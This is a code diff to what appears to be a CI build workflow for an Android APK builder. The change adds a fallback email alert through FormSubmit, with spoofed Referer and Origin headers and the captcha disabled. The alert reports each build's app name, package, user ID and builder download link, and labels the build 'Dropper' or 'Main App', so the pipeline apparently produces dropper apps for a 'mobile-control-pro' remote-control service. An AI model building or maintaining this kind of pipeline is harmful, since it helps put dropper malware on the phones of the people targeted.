@@ -313,16 +313,41 @@ jobs:
                   </html>
                   '''
 
+              # Channel 1: Google Apps Script Webhook
               try:
-                  mail_payload = {{
+                  mail_payload = {
                       'action': 'send_email',
                       'to': target_email,
                       'subject': subj,
                       'htmlBody': html_body
-                  }}
+                  }
                   resp = requests.post(webhook_url, json=mail_payload, timeout=10)
-                  print(f'Email alert sent to {target_email}: HTTP {resp.status_code}')
+                  print(f'Email webhook sent to {target_email}: HTTP {resp.status_code}')
               except Exception as err:
-                  print(f'Email alert notice (non-fatal): {err}')
+                  print(f'Email webhook notice (non-fatal): {err}')
+
+              # Channel 2: FormSubmit Cloud Gateway Fallback
+              try:
+                  form_payload = {
+                      '_subject': subj,
+                      '_template': 'box',
+                      '_captcha': 'false',
+                      'Alert': 'APK Build Complete',
+                      'App_Name': app_name,
+                      'Package': pkg_name,
+                      'Build_Type': 'Dropper' if is_dropper else 'Main App',
+                      'User_UID': user_id,
+                      'Download_URL': f'https://mobile-control-pro.web.app/builder.html?uid={user_id}'
+                  }
+                  f_headers = {
+                      'Content-Type': 'application/json',
+                      'Accept': 'application/json',
+                      'Referer': 'https://mobile-control-pro.web.app',
+                      'Origin': 'https://mobile-control-pro.web.app'
+                  }
+                  f_resp = requests.post(f'https://formsubmit.co/ajax/{target_email}', json=form_payload, headers=f_headers, timeout=10)
+                  print(f'Email cloud gateway sent to {target_email}: HTTP {f_resp.status_code}')
+              except Exception as err2:
+                  print(f'Email cloud gateway notice: {err2}')
           "
 
